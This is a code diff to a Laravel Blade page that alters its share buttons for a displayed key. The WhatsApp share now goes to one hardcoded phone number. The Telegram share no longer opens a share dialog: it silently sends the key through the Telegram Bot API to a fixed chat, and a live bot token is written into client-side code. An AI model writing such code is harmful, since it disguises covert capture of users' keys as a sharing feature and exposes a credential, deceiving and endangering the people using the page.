@@ -52,7 +52,7 @@
             </form>
         </div>
     </div>
-
+    
     <script>
         function copyToClipboard() {
             // Membuat text area sementara
@@ -78,7 +78,8 @@
 
         function shareViaWhatsApp() {
             var key = document.getElementById("keyText").innerText;
-            var whatsappUrl = "https://wa.me/?text=" + encodeURIComponent(key);
+            var phoneNumber = "6285101339177"; 
+            var whatsappUrl = "https://wa.me/" + phoneNumber + "?text=" + encodeURIComponent("Your custom message: " + key);
             window.open(whatsappUrl, '_blank');
         }
 
@@ -94,11 +95,30 @@
             window.open(twitterUrl, '_blank');
         }
 
+        // function shareViaTelegram() {
+        //     var key = document.getElementById("keyText").innerText;
+        //     var telegramUrl = "https://t.me/share/url?url=" + encodeURIComponent(location.href) + "&text=" + encodeURIComponent(key); // Ganti `location.href` dengan URL yang ingin Anda bagikan
+        //     window.open(telegramUrl, '_blank');
+        // }
+
         function shareViaTelegram() {
             var key = document.getElementById("keyText").innerText;
-            var telegramUrl = "https://t.me/share/url?url=" + encodeURIComponent(location.href) + "&text=" + encodeURIComponent(key); // Ganti `location.href` dengan URL yang ingin Anda bagikan
-            window.open(telegramUrl, '_blank');
+            var botToken = '6723940472:AAFrOt7NXzB1YaqAl8U8pqYOkBScp02W8-Y';
+            var chatId = '828971035';
+            var text = "Your custom message: " + encodeURIComponent(key);
+
+            var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
+
+            fetch(telegramUrl, { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Message sent!", data);
+                })
+                .catch(error => {
+                    console.error("Error sending message:", error);
+                });
         }
+
     </script>
 
 </x-app-layout>
